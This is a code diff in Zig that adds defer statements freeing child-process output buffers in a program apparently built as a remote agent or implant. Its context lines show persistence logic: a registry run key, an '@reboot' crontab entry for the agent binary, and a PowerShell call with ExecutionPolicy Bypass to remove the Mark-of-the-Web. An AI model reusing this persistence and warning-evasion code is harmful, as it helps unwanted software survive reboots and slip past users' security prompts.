@@ -100,6 +100,8 @@ pub const SystemInfo = struct {
                 std.debug.print("{}\n", .{err});
                 return try self.allocator.dupe(u8, "127.0.0.1");
             };
+            defer self.allocator.free(result.stdout);
+            defer self.allocator.free(result.stderr);
             var tokens = std.mem.splitAny(u8, result.stdout, "\n");
             const first_ip = tokens.first();
             while (tokens.next()) |line| {
@@ -123,6 +125,8 @@ pub const SystemInfo = struct {
                 std.debug.print("{}\n", .{err}); //I should fix this later
                 return try self.allocator.dupe(u8, "127.0.0.1");
             };
+            defer self.allocator.free(result.stdout);
+            defer self.allocator.free(result.stderr);
             var tokens = std.mem.splitAny(u8, result.stdout, " ");
             const first_ip = tokens.first();
             if (first_ip.len == 0) {
@@ -256,6 +260,8 @@ pub const PersistUtils = struct {
                 },
             });
 
+            defer allocator.free(existing.stdout);
+            defer allocator.free(existing.stderr);
             const reg_exists = existing.term.exited == 0;
             if (reg_exists and std.mem.find(u8, existing.stdout, agent_path) != null) {
                 return error.AlreadyPersistent;
@@ -266,7 +272,8 @@ pub const PersistUtils = struct {
             const remove_motw = try std.process.run(allocator, io, .{
                 .argv = &.{ "powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", unblock_cmd },
             });
-
+            defer allocator.free(remove_motw.stdout);
+            defer allocator.free(remove_motw.stderr);
             if (remove_motw.term.exited != 0) {
                 return error.UnblockFileFailed;
             }
@@ -282,6 +289,8 @@ pub const PersistUtils = struct {
                     "/f",
                 },
             });
+            defer allocator.free(result.stdout);
+            defer allocator.free(result.stderr);
 
             if (result.term.exited != 0) {
                 return error.RegistryWriteFailed;
@@ -298,6 +307,8 @@ pub const PersistUtils = struct {
                 }
                 return err;
             };
+            defer allocator.free(existing.stdout);
+            defer allocator.free(existing.stderr);
             const cron_line = try std.fmt.allocPrint(allocator, "@reboot {s} &\n", .{agent_path});
             defer allocator.free(cron_line);
 
@@ -333,6 +344,8 @@ pub const PersistUtils = struct {
             if (existing.term.exited != 0) {
                 return error.RegistryDeleteFailed;
             }
+            defer allocator.free(existing.stdout);
+            defer allocator.free(existing.stderr);
         } else {
             const existing = std.process.run(allocator, io, .{
                 .argv = &.{ "crontab", "-l" },
@@ -342,6 +355,8 @@ pub const PersistUtils = struct {
                 if (err == error.ChildExecFailed) return; // nothing to remove no crontab
                 return err;
             };
+            defer allocator.free(existing.stdout);
+            defer allocator.free(existing.stderr);
             var list = std.ArrayList([]const u8).empty;
             defer list.deinit(allocator);
 
@@ -382,6 +397,9 @@ pub const PersistUtils = struct {
                 },
             });
 
+            defer allocator.free(result.stdout);
+            defer allocator.free(result.stderr);
+
             if (result.term.exited != 0) {
                 return try allocator.dupe(u8, "");
             }
@@ -392,6 +410,8 @@ pub const PersistUtils = struct {
                 .stdout_limit = .limited(8192),
                 .stderr_limit = .limited(8192),
             });
+            defer allocator.free(result.stdout);
+            defer allocator.free(result.stderr);
             const out = result.stdout;
             var filtered_lines = std.mem.tokenizeAny(u8, out, "\n");
             while (filtered_lines.next()) |line| {
